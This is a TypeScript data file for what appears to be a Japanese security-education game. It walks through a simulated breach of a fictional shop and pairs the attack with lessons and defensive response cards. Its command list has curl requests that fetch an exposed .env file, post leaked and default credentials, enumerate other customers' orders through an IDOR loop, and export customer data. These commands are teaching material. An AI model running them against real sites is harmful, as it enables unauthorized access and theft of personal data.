export const stageText = [
  "",
  "公開された `.env` が200を返した時点で設定ミスは確定。秘密情報を公開領域に置いてはいけません。",
  "使い回し・古い認証情報は侵入の入口になります。漏えい後はパスワードを変更しましょう。",
  "他人の注文IDを変えるだけで取得できるIDORは、オブジェクト単位の認可不足です。",
  "管理者認証情報の保護と多要素認証が重要です。",
  "大量エクスポートの監視と制限でデータ流出を防ぎます。",
];

export const instructions: {
  title: string;
  goal: string;
  commands: { text: string; description: string }[];
}[] = [
  {
    title: "偵察",
    goal: "対象ホストを調べ、公開設定ファイルを確認する。",
    commands: [
      {
        text: "nmap -sV shop.komaba-market.example",
        description:
          "対象ホストの公開ポートとサービスのバージョンを調べます。結果は固定シナリオです。",
      },
      {
        text: "curl https://shop.komaba-market.example",
        description: "HTTPSでトップページを取得し、サイトが応答することを確認します。",
      },
      {
        text: "curl https://shop.komaba-market.example/.env",
        description:
          "公開されてしまった環境設定ファイルを取得します。応答にスタッフ認証情報が含まれます。",
      },
    ],
  },
  {
    title: "認証情報",
    goal: "設定ファイルから見つけたスタッフ情報をログインAPIへPOSTする。",
    commands: [
      {
        text: 'curl -X POST -H \'Content-Type: application/json\' -d \'{"email":"staff-old@komaba-market.example","password":"Komaba2023!"}\' https://shop.komaba-market.example/api/login',
        description:
          "JSON形式の認証情報をログインAPIへPOSTします。成功すると、以降のAPIで使うデモトークンが返ります。",
      },
    ],
  },
  {
    title: "初期侵入",
    goal: "注文APIの認可を調べ、他人の注文情報にアクセスできるか確認する。",
    commands: [
      {
        text: 'curl -H "Authorization: Bearer demo_tok_4f2a" https://shop.komaba-market.example/api/orders/1002',
        description:
          "Bearerトークンを付けて注文APIを呼び出します。まず指定された注文IDのレスポンスを確認します。",
      },
      {
        text: 'for id in {1001..1050}; do curl -H "Authorization: Bearer demo_tok_4f2a" "https://shop.komaba-market.example/api/orders/$id"; done',
        description:
          "Bashのforループで注文IDを連番にしてリクエストします。ゲーム内ではこの既知の構文を固定データとしてシミュレートし、シェルは実行しません。",
      },
    ],
  },
  {
    title: "権限昇格",
    goal: "robots.txtを確認し、管理者としてログインする。",
    commands: [
      {
        text: "curl https://shop.komaba-market.example/robots.txt",
        description: "robots.txtを取得して、公開情報として示された管理用パスを確認します。",
      },
      {
        text: 'curl -X POST -H \'Content-Type: application/json\' -d \'{"username":"admin","password":"admin123"}\' https://shop.komaba-market.example/admin/login',
        description:
          "見つけた管理者認証情報を管理ログインAPIへPOSTします。注文情報の認可不備を確認した後に成功します。",
      },
    ],
  },
  {
    title: "持ち出し",
    goal: "管理画面から顧客データのエクスポートを試す。",
    commands: [
      {
        text: "curl https://shop.komaba-market.example/admin/export/customers.csv -o customers.csv",
        description:
          "管理者権限で顧客CSVを取得し、customers.csvへ保存する操作をシミュレートします。実ファイルや通信は発生しません。",
      },
    ],
  },
];

export const responseCards = [
  ["block-ip", "攻撃元IPを遮断"],
  ["disable-staff", "スタッフログイン停止"],
  ["fix-env", "公開設定ファイル修正"],
  ["fix-orders-auth", "注文APIの認可修正"],
  ["restrict-admin", "管理画面を制限"],
  ["admin-mfa", "管理者MFAを必須化"],
  ["limit-download", "大量ダウンロード制限"],
];
